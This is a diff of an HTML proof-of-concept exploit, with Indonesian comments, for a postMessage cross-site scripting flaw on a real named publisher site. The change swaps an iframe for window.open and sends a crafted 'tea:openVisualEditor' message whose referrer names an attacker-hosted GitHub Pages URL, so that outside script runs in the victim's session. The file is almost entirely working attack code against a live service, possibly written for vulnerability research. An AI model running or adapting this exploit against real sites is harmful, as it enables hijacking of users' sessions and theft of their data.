@@ -1,26 +1,31 @@
+<!-- poc.html — pakai window.open instead -->
 <html>
 <body>
 <h2>postMessage XSS PoC</h2>
-<p id="status">Loading...</p>
-<iframe id="target" 
-  src="https://www.pangleglobal.com/publisher/companyInfo" 
-  style="width:100%;height:500px">
-</iframe>
+<p id="status">Click button to start</p>
+<button onclick="startPoC()">Launch PoC</button>
 <script>
-  const ATTACKER = 'https://telojos11.github.io/cekcek';
-  const iframe = document.getElementById('target');
-  const status = document.getElementById('status');
+const ATTACKER = 'https://telojos11.github.io/cekcek';
+
+function startPoC() {
+  document.getElementById('status').textContent = 'Opening target...';
   
-  iframe.onload = () => {
-    status.textContent = 'Step 1: iframe loaded, sending payload...';
+  // Buka target di window baru
+  const target = window.open('https://www.pangleglobal.com/publisher/companyInfo');
+  
+  setTimeout(() => {
+    document.getElementById('status').textContent = 'Sending payload...';
     
-    iframe.contentWindow.postMessage(JSON.stringify({
+    // Kirim ke semua window (broadcast)
+    target.postMessage(JSON.stringify({
       type: 'tea:openVisualEditor',
       payload: { referrer: ATTACKER }
     }), '*');
     
-    status.textContent = 'Step 2: Payload sent! Waiting for XSS...';
-  };
+    document.getElementById('status').textContent = 
+      'Payload sent! Check the opened window for XSS execution.';
+  }, 3000); // tunggu 3 detik untuk page load
+}
 </script>
 </body>
 </html>
